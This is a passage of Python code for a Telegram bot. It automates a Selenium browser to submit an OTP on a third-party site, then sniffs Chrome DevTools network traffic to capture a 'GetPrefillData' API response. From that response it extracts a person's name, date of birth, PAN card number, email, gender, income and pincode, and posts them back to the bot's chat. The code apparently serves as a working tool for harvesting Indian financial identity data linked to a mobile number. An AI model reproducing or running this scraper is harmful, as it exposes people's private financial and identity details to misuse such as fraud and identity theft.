        except Exception as e: return False, "Extraction Crash", str(e)
        finally:
            try: driver.quit()
            except: pass

    async with BROWSER_LIMIT:
        success, result, trace_msg = await asyncio.to_thread(cm_scrape, temp['pan_cm_driver'], otp)
    await process_final_result(uid, message.chat.id, success, result, trace_msg)

# ==============================================================================
# IL PURE CDP EXTRACTOR
# ==============================================================================
@bot.message_handler(func=lambda m: RUNTIME_STATES.get(m.from_user.id, {}).get('state') == "WAIT_PAN_IL_OTP")
async def handle_pan_il_otp(message):
    uid = message.from_user.id
    RUNTIME_STATES[uid]['state'] = "PROCESSING"
    temp = RUNTIME_STATES[uid]['temp']
    
    otp = re.sub(r'\D', '', message.text)
    if len(otp) != 6:
        RUNTIME_STATES[uid]['state'] = "WAIT_PAN_IL_OTP"
        temp_msg = await bot.reply_to(message, "<code>[!] Required 6 Digits.</code>", parse_mode='HTML')
        await asyncio.sleep(2); await bot.delete_message(message.chat.id, temp_msg.message_id)
        return
        
    try: await bot.delete_message(message.chat.id, message.message_id)
    except: pass

    temp['step_log'] += "<code>[+] Native CDP Sniffing Active...</code>\n"
    await safe_edit(get_op_ui(temp['mobile'], temp['step_log']), message.chat.id, temp['msg_id'])

    def il_cdp_scrape(driver, otp_code):
        try:
            # Clear old logs
            _ = driver.get_log("performance")

            for i in range(6):
                try:
                    b = driver.find_element(By.ID, f"txt_otp{i}")
                    b.click(); b.send_keys(otp_code[i])
                    if i == 5: b.send_keys(Keys.ENTER)
                except: pass

            try: 
                driver.execute_script("""
                    var tnc = document.getElementById('tnc'); if(tnc && !tnc.checked) tnc.click();
                    var btns = document.querySelectorAll('button');
                    for(var i=0; i<btns.length; i++) if(btns[i].innerText.toLowerCase().includes('verify')) { btns[i].click(); break; }
                """)
            except: pass

            extracted_data = None
            target_api = "GetPrefillData"

            for _ in range(50):
                try:
                    error_msg = driver.execute_script("""
                        var ids = ['error_txtOtp', 'error-text'];
                        for(var i=0; i<ids.length; i++) {
                            var el = document.getElementById(ids[i]);
                            if(el && window.getComputedStyle(el).display !== 'none' && el.innerText.trim()) return el.innerText.trim();
                        } return null;
                    """)
                    if error_msg: return False, "Invalid OTP", error_msg
                except: pass 

                # Native CDP Capture
                try:
                    logs = driver.get_log("performance")
                    for entry in logs:
                        log = json.loads(entry["message"])["message"]
                        if log["method"] == "Network.responseReceived" and target_api in log["params"]["response"]["url"]:
                            req_id = log["params"]["requestId"]
                            try:
                                body = driver.execute_cdp_cmd("Network.getResponseBody", {"requestId": req_id})
                                raw_json = body["body"]
                                parsed = json.loads(raw_json)
                                extracted_data = json.loads(parsed) if isinstance(parsed, str) else parsed
                                break
                            except Exception: pass
                except Exception: pass

                if extracted_data: break
                time.sleep(0.2)

            if extracted_data:
                name = extracted_data.get('FullName', 'N/A')
                dob = extracted_data.get('DOB', 'N/A')
                pan = extracted_data.get('PAN', 'N/A')
                email = extracted_data.get('Email', 'N/A')
                gv = extracted_data.get('Gender')
                
                if not name or name in ["None", "NA", "N/A", ""] or not dob or dob in ["None", "NA", "N/A", ""]:
                    return False, "Data Not Found", "Extraction yielded None/NA for Name/DOB"
                    
                return True, {
                    'Name': name, 'DOB': dob, 'PAN Card': pan, 'Email': email,
                    'Gender': 'Male' if gv=='1' else 'Female' if gv=='2' else str(gv) if gv else 'N/A', 
                    'Income': extracted_data.get('Income', 'N/A'), 'Pincode': extracted_data.get('Pincode', 'N/A')
                }, "Success"
            else: return False, "Data Not Found", "Failed to capture CDP API response."
        except Exception as e: return False, "Extraction Crash", str(e)
        finally:
            try: driver.quit()
            except: pass

    async with BROWSER_LIMIT:
        success, result, trace_msg = await asyncio.to_thread(il_cdp_scrape, temp['pan_il_driver'], otp)
    await process_final_result(uid, message.chat.id, success, result, trace_msg)

async def start_bot():
    await init_db()
    try: await bot.delete_webhook(drop_pending_updates=True)
    except: pass
    print("[*] Native CDP Engine Online!")
    while True:
        try: await bot.polling(non_stop=True, request_timeout=60, timeout=60)
        except Exception: await asyncio.sleep(3)

if __name__ == '__main__':
    asyncio.run(start_bot())
